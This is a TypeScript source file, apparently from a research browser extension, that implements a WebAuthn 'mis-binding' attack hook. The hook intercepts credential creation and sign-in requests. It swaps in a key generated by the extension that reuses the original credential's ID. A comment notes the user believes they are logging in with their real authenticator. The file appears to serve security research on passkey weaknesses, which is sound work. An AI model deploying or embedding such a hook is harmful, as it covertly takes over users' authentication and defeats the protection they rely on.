import { AttackHook } from './attack_hook';
import { getOriginFromUrl, webauthnParse, webauthnStringify } from '../utils';
import { generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError, generateKeyRequestAndAttestation } from '../webauthn';
// import { generateKeyRequestAndAttestation, generateRegistrationKeyAndAttestation, DirectAttestationError, NoKeysRequestedError } from '../webauthn';
import { WebAuthnRequestMessage, WebAuthnResponseMessage, WebAuthnErrorMessage } from '../types/types';

export class AttackHookMisBinding extends AttackHook {
    logHelper(...msg: any[]): void {
        console.log('[AttackHookMisBinding] ', msg);
    }
    getName(): string {
        return 'attack-mis-binding';
    }

    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        this.logHelper('misbind onCredentialCreate called:', msg, sender);
        if (!sender.url) {
            return {
                requestID: msg.requestID,
                type: 'error',
                exception: "No sender URL found. BROKEN FUNCTIONALITY"
            };
        }
        const origin = getOriginFromUrl(sender.url);

        const originalCredential = webauthnParse(msg.originalCredential);
        this.logHelper('originalCredential', originalCredential);

        const id = originalCredential.id;
        this.logHelper('id', id);
        const rawId = Array.from(new Uint8Array(originalCredential.rawId));
        this.logHelper('rawId', rawId);
        try {
            if (!origin) {
                throw new Error("BROKEN FUNCTIONALITY misbinding. No origin")
            }
            const opts = webauthnParse(msg.options);
            this.logHelper('opts', opts);
            this.logHelper(msg);
            const credential = await generateRegistrationKeyAndAttestation(
                origin,
                opts.publicKey,
                '9999',
                id,
                rawId,
            );

            this.logHelper('create credential');
            this.logHelper(credential);
            this.logHelper(webauthnStringify(credential));
            this.logHelper('RE PARSE ', webauthnParse(webauthnStringify(credential)));
            return {
                credential: webauthnStringify(credential),
                requestID: msg.requestID,
                type: 'create_response',
            };
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                this.logHelper('failed to import key due to DOMException', { code, message, name }, e);
            } else {
                this.logHelper('failed to import key', { errorType: `${(typeof e)}` }, e);
            }

            return {
                requestID: msg.requestID,
                type: 'error',
                exception: e!.toString()
            };
        }
    }

    async onCredentialGet(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender): Promise<WebAuthnResponseMessage | WebAuthnErrorMessage> {
        this.logHelper('misbind onCredentialGet called:', msg, sender);
        // return {
        //     type: 'sign_response',
        //     requestID: msg.requestID,
        //     credential: msg.originalCredential,
        // }

        //  Uncooment the following to allow login using the dummy authenticator while user thinks they are logging through real.
        const origin = getOriginFromUrl(sender.url!);
        const opts = webauthnParse(msg.options);

        this.logHelper(opts);
        // const pin = await requestPin(sender.tab.id, origin);
        this.logHelper('Origin in background sign function', origin);

        try {
            const credential = await generateKeyRequestAndAttestation(origin!, opts.publicKey, `9999`, msg.originalCredential);
            const authenticatedResponseData: WebAuthnResponseMessage = {
                credential: webauthnStringify(credential),
                requestID: msg.requestID,
                type: 'sign_response',
            };
            this.logHelper(msg);
            this.logHelper('auth credential');
            this.logHelper(credential);
            this.logHelper(webauthnStringify(credential));
            return authenticatedResponseData;
        } catch (e) {
            if (e instanceof DOMException) {
                const { code, message, name } = e;
                this.logHelper('failed to sign due DOMException', { code, message, name }, e);
            } else {
                this.logHelper('failed to sign', { errorType: `${(typeof e)}` }, e);
            }

            return {
                requestID: msg.requestID,
                type: 'error',
                exception: e!.toString()
            };
        }
    }
}